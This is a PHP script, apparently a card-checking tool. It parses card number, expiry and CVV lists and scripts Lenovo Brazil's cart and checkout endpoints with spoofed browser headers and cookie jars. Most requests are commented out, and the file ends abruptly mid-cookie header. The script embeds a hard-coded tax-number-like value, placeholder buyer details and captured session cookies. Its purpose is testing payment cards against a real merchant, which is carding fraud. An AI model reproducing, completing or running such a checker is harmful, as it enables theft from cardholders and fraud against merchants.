<?php
error_reporting(0);

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@pladixoficial</span><br>');
}

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

if (strlen($ano) < 4) {
    $ano = "20" . $ano;
}

 if (strlen($ano) == 4){
  $anodoiss = substr($ano , 2);
} 

$mesnoovo = ltrim($mes, "0");

$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';

if (!is_dir(__DIR__.'/cookies/')){
  mkdir(__DIR__.'/cookies/' ,0777 , true);
}

foreach (glob(__DIR__."/cookies/*.txt") as $file) {
  if (strpos($file, 'cookie_') !== false){
    unlink($file);
  }
}

################################################################################################

$inicio = microtime(true);

// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://www.lenovo.com/br/pt/',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: www.lenovo.com',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);

// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/dict/getdictinfo',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_HTTPHEADER => [
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);



// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/leid/assign',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'accept: */*',
//     'accept-encoding: gzip, deflate, br, zstd',
//     'accept-language: en-US,en;q=0.9',
//     'connection: keep-alive',
//     'host: openapi.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/pc/',
//     'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
//     'sec-ch-ua-mobile: ?0',
//     'sec-ch-ua-platform: "Windows"',
//     'sec-fetch-dest: script',
//     'sec-fetch-mode: no-cors',
//     'sec-fetch-site: same-site',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/auth/assign_cookie?wishlistpns=1&searchabran=1&zipcode=1',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);



// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: www.lenovo.com',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/product/flag?productNumber=4X90L13971',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);



// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://www.lenovo.com/ssp/pbd2_cih/46361539299034570393334928877530780822',
//   CURLOPT_HEADER => 1,
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_HTTPHEADER => [
//     'host: www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/dict/pquery',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'accept: */*',
//     'accept-encoding: gzip, deflate, br, zstd',
//     'accept-language: en-US,en;q=0.9',
//     'connection: keep-alive',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/pc/',
//     'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
//     'sec-ch-ua-mobile: ?0',
//     'sec-ch-ua-platform: "Windows"',
//     'sec-fetch-dest: empty',
//     'sec-fetch-mode: cors',
//     'sec-fetch-site: same-site',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://api.bluecore.app/api/track/add_to_cart',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'data=eyJldmVudCI6ICJhZGRfdG9fY2FydCIsInByb3BlcnRpZXMiOiB7Im9zIjogIldpbmRvd3MiLCJicm93c2VyIjogIkNocm9tZSIsImRldmljZSI6ICJPdGhlciIsIm1wX2xpYiI6ICJ3ZWIiLCJkaXN0aW5jdF9pZCI6ICIxOTdiMjdmOTBkYjI5OS0wMWM0NzEwNmUxYjFkODgtMjYwMTFlNTEtMTAwMjAwLTE5N2IyN2Y5MGRjZGFkIiwicHJvZHVjdHMiOiBbCiAgICB7ImlkIjogIjRYOTBMMTM5NzEifQpdLCJiY190cmFja19tZXRhZGF0YV90cmlnZ2VyIjogIntcImFjdGlvblwiOlwibW91c2Vkb3duXCIsXCJsb2NhdGlvblwiOlwiYnV0dG9uLmN0YV9idXR0b25cIixcImxvY2F0aW9uX2dyb3VwXCI6XCJwZHBcIn0iLCJ0b2tlbiI6ICJsZW5vdm9fYnIiLCJ1cmwiOiAiaHR0cHM6Ly93d3cubGVub3ZvLmNvbS9ici9wdC9wL2FjY2Vzc29yaWVzLWFuZC1zb2Z0d2FyZS9jYWJsZXMtYW5kLWFkYXB0ZXJzL2NhYmxlcy1hbmQtYWRhcHRlcnNfYWRhcHRlcnMvNHg5MGwxMzk3MSIsImludGVncmF0aW9uX3ZlcnNpb24iOiAxNzUwNjc1MTc3LCJzZXNzaW9uX2lkX3YyIjogIjM4MDMxZTRlLTk2ZDQtNGNkZi05NzI1LTE5MmFmNGI0ZGFiNyIsIm9yaWdpbmFsX3VzZXJfdHlwZSI6ICJuZXciLCJjdXJyZW50X3VzZXJfdHlwZSI6ICJyZXR1cm5pbmciLCJzZXNzaW9uX3B2YyI6IDcsImRheV9wdmMiOiA3LCJiY19zb3VyY2VfZGV0YWlsIjogImRpcmVjdCIsImJjX3NvdXJjZV9tZWRpdW0iOiAiZGlyZWN0Iiwic2Vzc2lvbl9pZCI6ICIxNzUxMDQ2Mzk2MDQ2IiwiZXZlbnRfc291cmNlIjogImN1c3RvbV9pbnRlZ3JhdGlvbiJ9fQ%3D%3D&ip=1&_=1751047015980',
//   CURLOPT_HTTPHEADER => [
//     'accept: */*',
//     'accept-encoding: gzip, deflate, br, zstd',
//     'accept-language: en-US,en;q=0.9',
//     'connection: keep-alive',
//     'content-type: application/x-www-form-urlencoded',
//     'host: api.bluecore.app',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//     'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
//     'sec-ch-ua-mobile: ?0',
//     'sec-ch-ua-platform: "Windows"',
//     'sec-fetch-dest: empty',
//     'sec-fetch-mode: cors',
//     'sec-fetch-site: cross-site',
//     'sec-fetch-storage-access: active',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);



// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://api.bluecore.app/api/track/customer_patch',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'data=eyJldmVudCI6ICJjdXN0b21lcl9wYXRjaCIsInByb3BlcnRpZXMiOiB7Im9zIjogIldpbmRvd3MiLCJicm93c2VyIjogIkNocm9tZSIsImRldmljZSI6ICJPdGhlciIsIm1wX2xpYiI6ICJ3ZWIiLCJkaXN0aW5jdF9pZCI6ICIxOTdiMjdmOTBkYjI5OS0wMWM0NzEwNmUxYjFkODgtMjYwMTFlNTEtMTAwMjAwLTE5N2IyN2Y5MGRjZGFkIiwiY3VzdG9tZXIiOiB7Imhhc19pdGVtX2luX2NhcnQiOiB0cnVlfSwiYmNfdHJhY2tfbWV0YWRhdGFfdHJpZ2dlciI6ICJ7XCJhY3Rpb25cIjpcIm1vdXNlZG93blwiLFwibG9jYXRpb25cIjpcImJ1dHRvbi5jdGFfYnV0dG9uXCIsXCJsb2NhdGlvbl9ncm91cFwiOlwicGRwXCJ9IiwidG9rZW4iOiAibGVub3ZvX2JyIiwidXJsIjogImh0dHBzOi8vd3d3Lmxlbm92by5jb20vYnIvcHQvcC9hY2Nlc3Nvcmllcy1hbmQtc29mdHdhcmUvY2FibGVzLWFuZC1hZGFwdGVycy9jYWJsZXMtYW5kLWFkYXB0ZXJzX2FkYXB0ZXJzLzR4OTBsMTM5NzEiLCJpbnRlZ3JhdGlvbl92ZXJzaW9uIjogMTc1MDY3NTE3Nywic2Vzc2lvbl9pZF92MiI6ICIzODAzMWU0ZS05NmQ0LTRjZGYtOTcyNS0xOTJhZjRiNGRhYjciLCJvcmlnaW5hbF91c2VyX3R5cGUiOiAibmV3IiwiY3VycmVudF91c2VyX3R5cGUiOiAicmV0dXJuaW5nIiwic2Vzc2lvbl9wdmMiOiA3LCJkYXlfcHZjIjogNywiYmNfc291cmNlX2RldGFpbCI6ICJkaXJlY3QiLCJiY19zb3VyY2VfbWVkaXVtIjogImRpcmVjdCIsInNlc3Npb25faWQiOiAiMTc1MTA0NjM5NjA0NiIsImV2ZW50X3NvdXJjZSI6ICJjdXN0b21faW50ZWdyYXRpb24ifX0%3D&ip=1&_=1751047015983',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded',
//     'host: api.bluecore.app',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/leid/assign',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: openapi.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/pc/',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/cart/item',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'productSource=pdp&qty=1&productCode=4X90L13971&coupon=&promotedOptions=',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/p/accessories-and-software/cables-and-adapters/cables-and-adapters_adapters/4x90l13971',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// echo $response = curl_exec($curl);



// die;


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/init',
//   CURLOPT_HEADER => 1,
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_POSTFIELDS => 'reuse=1&check=true',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/cart.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// echo $response = curl_exec($curl);

// die;

// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/init',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_POSTFIELDS => 'reuse=1',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/cart.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);



// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://www.lenovo.com/br/pt/checkout.html',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_HTTPHEADER => [
//     'host: www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/cart.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);




// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/shipment',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_POSTFIELDS => 'otpIn=false&consumerTaxNumber=902.062.901-87&individualRGID=ISENTO&customerType=0&firstname=pdxx&lastname=sasggsa&line1=Avenida%20Marechal%20Mascarenhas%20de%20Moraes&line2=&dni=&line3=125&district=Imbiribeira&confirmEmail=&managerEmail=&postalcode=51150-001&town=Recife&region=BR-PE&company=&email=ggsagsa25%40gmail.com&phone1=11999151515&extPhone1=&abnCode=&wlhPersonalNumber=&fax=&useDeliveryAddressForwlh=&bpId=&saveAddressAsDefault=false&saveAddress=false&thirdparty=true&expandedGuids=&signifydSessionId=s1388330851452157952',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/checkout.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);




// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/payment',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_CUSTOMREQUEST => 'GET',
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_HTTPHEADER => [
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/checkout.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);




// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/billing',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_COOKIEJAR => $dirCcookies,
//   CURLOPT_COOKIEFILE => $dirCcookies,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'customizeBillingAddress=0&cardHolderName=pdxx%20sasggsa&itemId=&firstname=pdxx&lastname=sasggsa&line1=Avenida%20Marechal%20Mascarenhas%20de%20Moraes&line2=&line3=125&town=Recife&region=BR-PE&regionShort=PE&regionName=Pernambuco&postalcode=51150-001&phone1=11999151515&extPhone1=&phone2=&extPhone2=&cellphone=&company=&companyTaxNumber=&email=ggsagsa25%40gmail.com&countryName=Brazil&countryCodeIso=br&abnCode=&managerEmail=&shippingFlag=false&billingFlag=false&defaultShippingAddress=false&defaultBillingAddress=false&bpId=&fax=&useDeliveryAddressForwlh=&wlhPersonalNumber=&o2oStorePhone=&o2oStoreEmail=&district=Imbiribeira&consumerTaxNumber=902.062.901-87&individualRGID=ISENTO&dni=&otpIn=false&crmAddressFlag=&type=&rr=',
//   CURLOPT_HTTPHEADER => [
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'host: openapi.lenovo.com',
//     'origin: https://www.lenovo.com',
//     'referer: https://www.lenovo.com/br/pt/checkout.html',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
//   ],
// ]);

// $response = curl_exec($curl);


// $curl = curl_init();
// curl_setopt_array($curl, [
//   CURLOPT_URL => 'https://openapi.lenovo.com/br/pt/api/checkout/shipment',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 30,
//   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'otpIn=false&consumerTaxNumber=902.062.901-87&individualRGID=ISENTO&customerType=0&firstname=casa&lastname=casasg&line1=Avenida%20Marechal%20Mascarenhas%20de%20Moraes&line2=&dni=&line3=123&district=Imbiribeira&confirmEmail=&managerEmail=&postalcode=51150-001&town=Recife&region=BR-PE&company=&email=sgasgagas%40gmail.com&phone1=11999151515&extPhone1=&abnCode=&wlhPersonalNumber=&fax=&useDeliveryAddressForwlh=&bpId=&saveAddressAsDefault=false&saveAddress=false&thirdparty=true&expandedGuids=&signifydSessionId=s1388394651202310144',
//   CURLOPT_HTTPHEADER => [
//     'accept: */*',
//     'accept-encoding: gzip, deflate, br, zstd',
//     'accept-language: en-US,en;q=0.9',
//     'connection: keep-alive',
//     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//     'cookie: Path=/; Path=/; Path=/; Path=/; zipcode=01000-000; city=S%C3%A3o+Paulo; timezone=America/Sao_Paulo; leid=2.m8K20k/i6hT; searchabran=1; PublicAlertPublicFirst=1; PublicAlertStoreFirst=isPublic; s_eng_rfd=0.00; _fbp=fb.1.1751046393214.31356298219447639; _ga=GA1.1.1432766635.1751046394; _gcl_au=1.1.957527426.1751046394; AMCV_F6171253512D2B8C0A490D45%40AdobeOrg=MCMID|46361539299034570393334928877530780822; _tt_enable_cookie=1; _ttp=01JYS7Z53S5XKTAMTE5YBPVA1Y_.tt.1; _clck=2x8go5%7C2%7Cfx4%7C0%7C2004; QuantumMetricUserID=e3d48c92a634cea46b46001379ad7431; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_identity=CiY0NjM2MTUzOTI5OTAzNDU3MDM5MzMzNDkyODg3NzUzMDc4MDgyMlISCImi%5FpP7MhABGAEqA1ZBNjAAoAGhov6T%2DzKoAczv9%5FX7qPrjCLABAfABiaL%2Dk%5Fsy; __idcontext=eyJjb29raWVJRCI6IjJ6Nkw2VllsSnFGTVRvV1V1cml2eW9GYlZFQiIsImRldmljZUlEIjoiMno2TDZYSWpacTNrM1RsSkFxdG85TWJqc0NaIiwiaXYiOiIiLCJ2IjoiIn0%3D; kndctr_F6171253512D2B8C0A490D45_AdobeOrg_consent=general%3Din; algorithmId_adobe=%7B%22pagefilterId%22%3A%22158f0d86-c70f-491c-984a-1fb8ef986109%22%2C%22algorithmId%22%3Anull%7D; recentlypns=4X90L13971; BVBRANDID=dec0fc2e-96b5-4376-99c0-645fc3762a5e; cartProductCodes=4X90L13971; publicStoreAlertHide=1; publicAlertHasCart=true; ttcsid=1751046395014::NWg4iXnZDZ0t5cD39tqE.1.1751047387850; _uetsid=aa9829b0537e11f089d449baa26539ac; _uetvid=aa984950537e11f0af019583c4c70518; _clsk=lumj5i%7C1751060129010%7C1%7C1%7Ce.clarity.ms%2Fcollect; ttcsid_CHJQK1JC77UBJAEB22VG=1751060576668::1QqwGIgn8Oq-ruTs5tcA.2.1751060578611; _ga_LXNLK45HZF=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; _ga_YF4MBY08PJ=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; _ga_1X0P7YKFM5=GS2.1.s1751060580$o2$g0$t1751060580$j60$l0$h0; orderAdobeTool=%7B%22j%22%3A%221.6%22%2C%22c%22%3A24%2C%22s%22%3A%221366x768%22%2C%22bw%22%3A1366%2C%22bh%22%3A641%2C%22v%22%3A%22N%22%2C%22k%22%3A%22Y%22%2C%22ce%22%3A%22UTF-8%22%7D; s_vnc365=1782596582102%26vn%3D2; s_eVar57=%3B4X90L13971%3B%3B%3B%3BeVar239%3DNo; email_256=sgasgagas@gmail.com; bm_sz=1992C77F806B54A48453CA6A2013FC25~YAAQzUIVAupTfpWXAQAAo4ZZsxy8sITqgENL1WIfsfIlnghwznKaNAPVRiRLMP3Q/2NxbN64PJaFyGek5vC/oP52b/J9+cYcTxA7SOTZ1uSj5WJQTIJ9myYkUOFMQUvn7rUP2/20okZyoYcdR4ny0xN8ckRCDBvkqUMmXebxzo2JiBMWqukq+SbjLfFcdFWnJmTz+/JhEF/2YoAspLdeNV7JmfakvkF7RP5ZoBce3TO2Yvmn0mCKRbcPaY9zSilKmNaufgzO2B3wFKmTvyaVxfiwcWD4NCxyNFULbDUMFq8LslPBlTE8aRQnY9cSTggWjiJ2WpoK2/kSCKvrLRkE+TC4vhKUtMssIncG2P+BdjbxDlHJrkXfKAM/5fNr85NYIgA5XXBj3EZ7hGO4LHEGhPGcn05bhzjLVHG552ZR9BNHIsxsuFL2CussHKauyQ==~3490615~4342838; s_tslv=1751060679600; s_tot_rfd=2.08; mp_lenovo_br_mixpanel=%7B%22distinct_id%22%3A%20%22197b27f90db299-01c47106e1b1d88-26011e51-100200-197b27f90dcdad%22%2C%22bc_persist_updated%22%3A%201751060606428%2C%22has_item_in_cart%22%3A%20false%2C%22bc_id_cache%22%3A%20%22%7B%5C%22email%5C%22%3A-1737812822%7D%22%2C%22bc_id%22%3A%20-1737812822%7D; 